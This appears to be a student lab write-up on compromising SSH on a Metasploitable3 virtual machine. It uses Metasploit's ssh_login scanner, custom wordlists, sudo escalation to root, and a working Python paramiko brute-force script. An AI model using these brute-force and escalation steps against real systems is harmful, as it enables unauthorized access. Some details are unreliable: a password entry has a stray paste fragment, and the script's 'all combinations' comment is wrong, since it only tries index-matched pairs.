## Setup
Installed Kali Linux installer image from the [official website](https://www.kali.org/get-kali/) and Metasploitable3 UB14.0.4 pre-built image, then created two virtual machines on VritualBox.

Kali Linux comes with Metasploit installed.

Using the command `ip a` on both machines, we can find their IPs as follows:
> **Metasploitable3** 192.168.56.102

> **Kali Linux** 192.168.56.103

## Task 1.1 - Compromising the service with Metasploit
The service that we chose for this project is **SSH (Secure Shell)**. The plan is to brute-force possible passwords using a words list, this is possible because the victim machine, Metasploitable3, does not have a service or daemon in place that prevents access after multiple authentication errors.

1- Validate that the SSH (default port: 22) service is running on the vicitm machine:
```bash
nmap -p 22 192.168.56.102
```
![Output](https://i.imgur.com/DeIKhrm.png)\
As seen, the service SSH is open on port 22.

2- Create a list of possible common Metasploitable3 credentials that we will use to brute-force authentication:
```bash
echo -e 'leah_organa\nluke_skywalker\nhan_solo\nartoo_detoo\nc_three_pio\nben_kenobi\nvagrant\ndarth_vader\nanakin_skywalker\njarjar_binks\nlando_calrissian\nboba_fett\njabba_hutt\ngreedo\nchewbacca\nkylo_ren' > usernames.txt
```
```bash
echo -e 'help_me_obiw@n\nuse_the_f0rce\nsh00t-first\nbeep_b00p\npr0t0c0l\nthats_no_moon\nvagrant\nd@rk_sid3\nyipp33vim passwords.txt\nmesah_p@ssw0rd\nb@ckstab\nmandalorian1\nnot-a-slug12\nhanShotFirst' > passwords.txt
```

3- Launch tool Metasploit:
```bash
msfconsole
```

4- Select the SSH service:
```bash
use auxiliary/scanner/ssh/ssh_login
```

5- Set IP address of target:
```bash
set RHOSTS 192.168.56.102
```

6- Now, we can use the files we created earlier:
```bash
set USER_FILE ~/usernames.txt
set PASS_FILE ~/passwords.txt
```

7- In order to see the output of this attack while it's running, we can enable VERBOSE:
```bash
set VERBOSE true
```
![Metasploit Attack Config](https://i.imgur.com/5WQEKpv.png)\
8- Execute the attack:
```bash
run
```
![Attack Result 1](https://i.imgur.com/l5T8jUE.png)\
![Attack Result 2](https://i.imgur.com/r0NEv1J.png)\
![Attack Result 3](https://i.imgur.com/MGC73JK.png)\
As seen, the Metasploit tool was able to find 3 valid SSH users from the list of common credentials. `boba_fett:mandalorian1`, `jarjar_binks:mesah_p@ssw0rd`, and `vagrant:vagrant`. We can also see that the first two users belong to the users group (GID 100) whereas `vagrant` belongs to a vagrant group (GID 900), this could indicate elevated or privileged access.

9- To test this, we can hook into the session it created, session 1:
```bash
sessions -i 1
```
Check sudo rights:
```bash
sudo -l
```
![Sudo Rights](https://i.imgur.com/ilkIhjs.png)\
As seen, the user `vagrant` can execute all commands passwordless as any user, meaning we can escalate to `root` directly and verify privilege escalation:
```bash
sudo su
whoami
```
![Root Escalation](https://i.imgur.com/vFuEHjm.png)\
This concludes our SSH attack on the Metasploitable3 virtual machine; we were able to successfully brute-force SSH credentials, login, and escalate our permissions to the `root` user.

## Task 1.2 - Compromising the service with a custom script
Since we are familiar with Python, we decided to use it. We did a bit of research and found a library called [paramiko](https://pypi.org/project/paramiko/) which implements the SSHv2 protocol and provides a client. This file is also available as ssh_attack.py in this phase's folder.

```python
# We need these libraries to establish a SSH connection and add delays
import paramiko
import time

# Attack-related data, we copied this from the usernames.txt and passwords.txt
metasploitable3_ip = "192.168.56.102"

usernames = [ "leah_organa", "luke_skywalker", "han_solo", "artoo_detoo", "c_three_pio", "ben_kenobi", "vagrant", "darth_vader", "anakin_skywalker", "jarjar_binks", "lando_calrissian", "boba_fett", "jabba_hutt", "greedo", "chewbacca", "kylo_ren" ]

passwords = [ "help_me_obiw@n", "use_the_force", "sh00t-first", "beep_b00p", "pr0t0c0l", "thats_no_moon", "vagrant", "d@rk_sid3", "yipp33!!", "mesah_p@ssw0rd", "b@ckstab", "mandalorian1", "not-a-slug12", "hanShotFirst!", "rwaaaaawr5", "daddy_issues1" ]

# This method attempts to establish a SSH connection with the username and password provided, if success returns the client connection, otherwise returns None
def attempt_login(user, pw):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(metasploitable3_ip, username=user, password=pw, timeout=5)
        print("Logging in as", user, pw)
        return client
    except:
        return None

# This method runs the privilege escalation and verification commands, will be used if a valid client is found
def run_cmds(client):
    shell = client.invoke_shell()
    time.sleep(0.5)
    shell.send("sudo su\n")
    time.sleep(0.5)
    shell.send("whoami\n")
    time.sleep(1)
    print(shell.recv(4096).decode())
    shell.close()

# Try all combinations
for i in range(0, len(usernames)):
    usr = usernames[i]
    pwd = passwords[i]
    status = False

    try:
        session = attempt_login(usr, pwd)

        if session:
            run_cmds(session)
            session.close()
            status = True

        # We got SSH banner errors for flooding connections so we added this delay
        time.sleep(1.5)

        print(usr, ":", pwd, status)
    except:
        print(usr, ":", pwd, "SSH error")

print("Complete.")
```
Run this script:
```bash
python ssh_attack.py
```
![Script Result](https://i.imgur.com/NRBFbHo.png)\
As seen, the `vagrant` user (in purple) manages to login and escalate privileges without a password (compromised successfully). The other users (in green), `jarjar_binks` and `boba_fett`, manage to login, but can not escalate privileges without a password due to insufficient permissions.